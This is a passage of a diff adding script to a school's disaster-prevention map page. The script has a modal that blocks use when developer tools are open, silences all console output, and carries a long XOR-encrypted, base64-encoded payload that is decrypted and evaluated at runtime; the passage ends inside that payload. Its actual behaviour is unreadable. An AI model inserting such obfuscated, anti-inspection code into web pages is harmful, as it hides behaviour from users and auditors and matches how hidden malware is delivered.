+    <!-- Security Shield Modal (shown when DevTools / inspection is detected) -->
+    <div id="security-shield" style="display: none;">
+        <div class="shield-card">
+            <div class="shield-icon">
+                <svg viewBox="0 0 24 24" width="42" height="42" fill="none" stroke="#ef4444" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+            </div>
+            <h2>セキュリティ保護中 / Security Notice</h2>
+            <p>本校の防災および校内マップ情報の安全保護のため、開発者モードおよび解析ツールの利用は制限されています。<br>
+            Developer tools inspection is restricted for security and privacy protection.</p>
+            <div class="shield-hint">開発者ツールを閉じると、自動的にマップ表示が復帰します。<br>Close developer tools to resume normal map view.</div>
+        </div>
+    </div>
+<script>
+        (function() {
+            // Anti-Tamper & Console Silencing
+            try {
+                var noop = function() {};
+                ['log', 'warn', 'error', 'info', 'debug', 'dir', 'table', 'trace'].forEach(function(m) {
+                    console[m] = noop;
+                });
+            } catch(e) {}
+
+            // Dynamic Decryption & Runtime Evaluator
+            function _decrypt(b64, key) {
+                var bin = atob(b64);
+                var bytes = new Uint8Array(bin.length);
+                var kl = key.length;
+                for (var i = 0; i < bin.length; i++) {
+                    bytes[i] = bin.charCodeAt(i) ^ key.charCodeAt(i % kl);
+                }
+                return new TextDecoder("utf-8").decode(bytes);
+            }
+
+            var _k = "Hosei_Intl_HS_BosaiMap_2026_SecureKey_#9928";
+            var _p = "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